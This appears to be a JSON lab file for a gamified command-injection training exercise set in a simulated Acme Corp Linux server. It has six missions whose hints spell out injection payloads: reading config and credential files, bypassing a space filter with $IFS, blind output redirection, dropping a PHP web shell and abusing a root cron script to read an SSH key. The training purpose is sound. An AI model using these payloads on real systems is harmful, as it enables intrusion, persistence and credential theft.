@@ -1,0 +1,220 @@
+{
+    "id": "cmd_injection_journey_v5",
+    "title": "Command Injection: The Complete Journey",
+    "description": "A 6-stage simulated attack against Acme Corp. Persistent OS environment. Prove your compromise through evidence.",
+    "osState": {
+        "filesystem": {
+            "/": { "type": "dir", "contents": ["home", "var", "etc", "opt", "root", "tmp"] },
+            "/tmp": { "type": "dir", "contents": [] },
+            "/root": { "type": "dir", "contents": [".ssh", "evidence.txt"] },
+            "/root/.ssh": { "type": "dir", "contents": ["id_rsa"] },
+            "/root/.ssh/id_rsa": { "type": "file", "content": "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAw7...\n(Root Private Key Evidence)\n-----END RSA PRIVATE KEY-----" },
+            "/root/evidence.txt": { "type": "file", "content": "You have achieved root access. The system is fully compromised." },
+            "/home": { "type": "dir", "contents": ["user"] },
+            "/home/user": { "type": "dir", "contents": [] },
+            "/var": { "type": "dir", "contents": ["www", "db", "log"] },
+            "/var/db": { "type": "dir", "contents": ["employee.db"] },
+            "/var/db/employee.db": { "type": "file", "content": "SQLite format 3\nuser_id,username,password_hash\n1,admin,$2y$10$wT8KzQ8J7y\n2,dev,$2y$10$xyz123" },
+            "/var/log": { "type": "dir", "contents": ["apache2"] },
+            "/var/log/apache2": { "type": "dir", "contents": ["access.log", "error.log"] },
+            "/var/log/apache2/access.log": { "type": "file", "content": "127.0.0.1 - - [21/Jun/2026:10:00:01 +0000] \"GET / HTTP/1.1\" 200" },
+            "/var/www": { "type": "dir", "contents": ["html"] },
+            "/var/www/html": { "type": "dir", "contents": ["index.php", "config.php", "uploads"] },
+            "/var/www/html/index.php": { "type": "file", "content": "<?php echo 'Ping Utility'; ?>" },
+            "/var/www/html/config.php": { "type": "file", "content": "<?php\n// Internal Config\n$db_host = '127.0.0.1';\n$db_user = 'root';\n$db_pass = 'sUp3r_s3cr3t_p4ss';\n?>" },
+            "/var/www/html/uploads": { "type": "dir", "contents": [] },
+            "/etc": { "type": "dir", "contents": ["passwd", "shadow"] },
+            "/etc/passwd": { "type": "file", "content": "root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" },
+            "/etc/shadow": { "type": "file", "content": "root:$6$xyz$abc:18000:0:99999:7:::" },
+            "/opt": { "type": "dir", "contents": ["scripts"] },
+            "/opt/scripts": { "type": "dir", "contents": ["backup.sh"] },
+            "/opt/scripts/backup.sh": { "type": "file", "content": "#!/bin/bash\necho 'Backing up employee database...'\ncat /var/db/employee.db > /var/www/html/uploads/backup.sql" }
+        },
+        "currentUser": "www-data",
+        "env": {
+            "PATH": "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+            "HOME": "/var/www",
+            "USER": "www-data",
+            "PWD": "/var/www/html",
+            "SHELL": "/bin/bash"
+        },
+        "processes": [
+            { "pid": 1, "user": "root", "cmd": "/sbin/init" },
+            { "pid": 501, "user": "root", "cmd": "/usr/sbin/sshd -D" },
+            { "pid": 1024, "user": "root", "cmd": "apache2 -k start" },
+            { "pid": 1025, "user": "www-data", "cmd": "apache2 -k start" },
+            { "pid": 2040, "user": "root", "cmd": "cron" }
+        ],
+        "network": {
+            "interfaces": [
+                { "name": "lo", "ip": "127.0.0.1", "mask": "255.0.0.0" },
+                { "name": "eth0", "ip": "10.10.10.5", "mask": "255.255.255.0" }
+            ],
+            "ports": [
+                { "proto": "tcp", "local": "0.0.0.0:80", "state": "LISTEN", "pid": "1024/apache2" },
+                { "proto": "tcp", "local": "0.0.0.0:22", "state": "LISTEN", "pid": "501/sshd" }
+            ],
+            "hostname": "acme-web-prod"
+        }
+    },
+    "missions": [
+        {
+            "id": "mission_1_access",
+            "title": "Level 1: Initial Access",
+            "scenario": {
+                "company": "Acme Corp",
+                "target": "Network Diagnostic Utility",
+                "difficulty": "Easy",
+                "estimated_time": "5 min",
+                "skills": ["Linux", "Recon"],
+                "story": "Acme Corp uses a diagnostic tool vulnerable to Command Injection. Let's prove we can execute code and steal the database password from the configuration file.",
+                "objective": "Read the configuration file (config.php) to find the DB password.",
+                "environment": {
+                    "os": "Linux",
+                    "web": "Apache",
+                    "lang": "PHP"
+                }
+            },
+            "objective_engine": {
+                "type": "file_read",
+                "target": "/var/www/html/config.php"
+            },
+            "hints": [
+                { "cost": 5, "text": "Use `; ls -la` to see the current directory contents." },
+                { "cost": 10, "text": "Read the config file using `; cat config.php`." }
+            ],
+            "rewards": { "xp": 100, "coins": 10 }
+        },
+        {
+            "id": "mission_2_bypass",
+            "title": "Level 2: Filtering & Bypass",
+            "scenario": {
+                "company": "Acme Corp",
+                "target": "Internal WAF",
+                "difficulty": "Medium",
+                "estimated_time": "10 min",
+                "skills": ["WAF Bypass", "Linux"],
+                "story": "We found the DB password, but the DB is internal. Let's find the SQLite database file on the disk, but wait! The WAF now blocks spaces.",
+                "objective": "Read the employee database (/var/db/employee.db) without using spaces.",
+                "environment": {
+                    "waf": "ModSecurity (Space Filter)"
+                },
+                "filters": {
+                    "blacklist": [" "],
+                    "feedback": {
+                        " ": "WAF Alert: Spaces are not allowed."
+                    }
+                }
+            },
+            "objective_engine": {
+                "type": "file_read",
+                "target": "/var/db/employee.db"
+            },
+            "hints": [
+                { "cost": 10, "text": "Use $IFS instead of a space. For example, `cat$IFS/etc/passwd`." },
+                { "cost": 15, "text": "Read the database using `;cat$IFS/var/db/employee.db`." }
+            ],
+            "rewards": { "xp": 150, "coins": 20 }
+        },
+        {
+            "id": "mission_3_discovery",
+            "title": "Level 3: Recon & Discovery",
+            "scenario": {
+                "company": "Acme Corp",
+                "target": "Log Files",
+                "difficulty": "Medium",
+                "estimated_time": "15 min",
+                "skills": ["Recon", "Linux Commands"],
+                "story": "There must be access logs stored somewhere on the server. Find them to gather more evidence of internal operations.",
+                "objective": "Discover and read the apache2 access.log.",
+                "environment": {}
+            },
+            "objective_engine": {
+                "type": "file_read",
+                "target": "/var/log/apache2/access.log"
+            },
+            "hints": [
+                { "cost": 10, "text": "Use `find /var -name access.log` to locate the file." },
+                { "cost": 15, "text": "Once found, use `cat` to read it." }
+            ],
+            "rewards": { "xp": 200, "coins": 30 }
+        },
+        {
+            "id": "mission_4_blind",
+            "title": "Level 4: Blind Exploitation",
+            "scenario": {
+                "company": "Acme Corp",
+                "target": "Blind Execution",
+                "difficulty": "Hard",
+                "estimated_time": "15 min",
+                "skills": ["Blind Injection", "Redirection"],
+                "story": "The server has been updated to suppress all output from the ping utility. You can execute commands, but you can't see the results directly on the screen.",
+                "objective": "Prove execution by redirecting the output of `id` into a file named `proof.txt` in the uploads directory.",
+                "environment": {
+                    "notes": "Blind Injection: No standard output is returned to the screen."
+                },
+                "filters": {
+                    "blind": true
+                }
+            },
+            "objective_engine": {
+                "type": "file_write",
+                "target": "/var/www/html/uploads/proof.txt",
+                "contains": "www-data"
+            },
+            "hints": [
+                { "cost": 15, "text": "Use output redirection `>`. For example, `; id > /var/www/html/uploads/proof.txt`." }
+            ],
+            "rewards": { "xp": 250, "coins": 40 }
+        },
+        {
+            "id": "mission_5_post",
+            "title": "Level 5: Post Exploitation",
+            "scenario": {
+                "company": "Acme Corp",
+                "target": "Web Directory",
+                "difficulty": "Hard",
+                "estimated_time": "15 min",
+                "skills": ["Web Shells", "Persistence"],
+                "story": "To ensure persistent access, you need to drop a web shell into the server. We need it in the public HTML directory.",
+                "objective": "Create a file named `shell.php` in `/var/www/html/` containing the string `<?php system($_GET['cmd']); ?>`.",
+                "environment": {}
+            },
+            "objective_engine": {
+                "type": "file_write",
+                "target": "/var/www/html/shell.php",
+                "contains": "<?php system($_GET['cmd']); ?>"
+            },
+            "hints": [
+                { "cost": 15, "text": "Use the `echo` command with redirection to write the PHP code into the file." },
+                { "cost": 20, "text": "Command: `; echo \"<?php system(\\$_GET['cmd']); ?>\" > /var/www/html/shell.php`" }
+            ],
+            "rewards": { "xp": 300, "coins": 50 }
+        },
+        {
+            "id": "mission_6_privesc",
+            "title": "Level 6: Privilege Escalation",
+            "scenario": {
+                "company": "Acme Corp",
+                "target": "Root Directory",
+                "difficulty": "Expert",
+                "estimated_time": "20 min",
+                "skills": ["PrivEsc", "Cron Abuse"],
+                "story": "You have a shell, but you're only 'www-data'. A cronjob runs `/opt/scripts/backup.sh` as root. Modify it to read the root's SSH key.",
+                "objective": "Obtain the contents of the private SSH key located at /root/.ssh/id_rsa.",
+                "environment": {
+                    "notes": "Cron runs scripts in /opt/scripts as root."
+                }
+            },
+            "objective_engine": {
+                "type": "file_read",
+                "target": "/root/.ssh/id_rsa"
+            },
+            "hints": [
+                { "cost": 20, "text": "Overwrite `/opt/scripts/backup.sh` to copy or cat the SSH key somewhere you can read it." },
+                { "cost": 25, "text": "Command: `; echo \"cat /root/.ssh/id_rsa\" > /opt/scripts/backup.sh` then execute `; /opt/scripts/backup.sh`." }
+            ],
+            "rewards": { "xp": 500, "coins": 100 }
+        }
+    ]
+}
